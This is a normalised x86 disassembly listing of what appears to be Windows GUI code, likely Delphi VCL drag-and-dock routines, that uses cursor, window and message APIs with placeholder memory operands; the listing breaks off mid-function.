jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44a90c
sub_44b2e0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_418304
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_418198
mov edx edi
mov eax [ rw-data ]
call sub_41814c
jmp r-xdata
sub_44b340
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_44b398
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4043ac
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_44a4e0
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_44b3f8
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_44b398
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44b424
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_44b184
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_44b3f8
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_44b340
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_453e1c
mov [ esi ] eax
sub_44b474
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_44b340
cmp eax 0x1
sbb eax eax
inc eax
sub_44b4b0
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_4528b8
test eax eax
je r-xdata
mov eax esi
call sub_4528b8
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_44bee0
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4182a8
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_418304
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_4528cc
mov edi eax
jmp r-xdata
sub_44b544
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_44b424
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_455940
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_44b474
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_44b474
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_44d178
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_44b474
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bbc4
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4558fc
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_44b4b0
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403370
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_455a28
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_455940
jmp r-xdata
mov eax [ rw-data ]
call sub_455a9c
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46bbc4
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_44d178
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403370
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403370
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407d40
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_44b814
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_44aa40
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_455940
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_44b544
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_44b984
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_44bb29
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403370
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403370
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ad48
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_44b814
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_44ac30
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_453e1c
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_416c28
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_44d14c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_416c28
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_44bb48
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403370
mov ebx eax
sub_44bbbc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_44be88
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_44be16
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_44aa88
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403324
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_44bb48
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_44b474
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_455a9c
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44be1d
mov eax [ rw-data ]
call sub_403174
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_464dc0
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_44e7e8
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_44b340
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_468b24
sub_44be1d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_403300
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
sub_44beac
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_44a514
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_44bee0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_44beac
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_44d178
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_451708
test eax eax
je r-xdata
mov esi eax
sub_44bf28
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_41814c
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx ] eax
sub_44bf50
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_418444
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403174
xor eax eax
mov [ ebx ] eax
sub_44bf70
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_44bfa0
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_418938
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c050
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41899c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_44c029
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_44c1dc
call sub_4039d4
call sub_4039d4
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4182a8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_42490c
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_44c05c
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418938
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44c0fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c101
mov eax [ rw-data ]
call sub_41899c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_44c0d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44c1dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_424968
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4182a8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_42490c
test al al
je r-xdata
sub_44c108
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_44c1dc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424424
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_44c134
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_424aec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_424af0
mov eax [ ebp - 0x4 ]
call sub_44c228
mov eax [ rw-data ]
call sub_418938
mov ebx eax
xor eax eax
push ebp
push sub_44c1b9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41814c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41899c
retn
call sub_44bfa0
sub_44c1dc
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_424af0
mov edx ebx
mov eax [ rw-data ]
call sub_41894c
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_44c228
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44dc78
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_44c254
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_44c290
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_418c54
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_44c2d8
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_44c394
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44c461
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c468
lea eax [ ebp - 0x1c ]
call sub_403eec
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403370
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_45cbbc
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
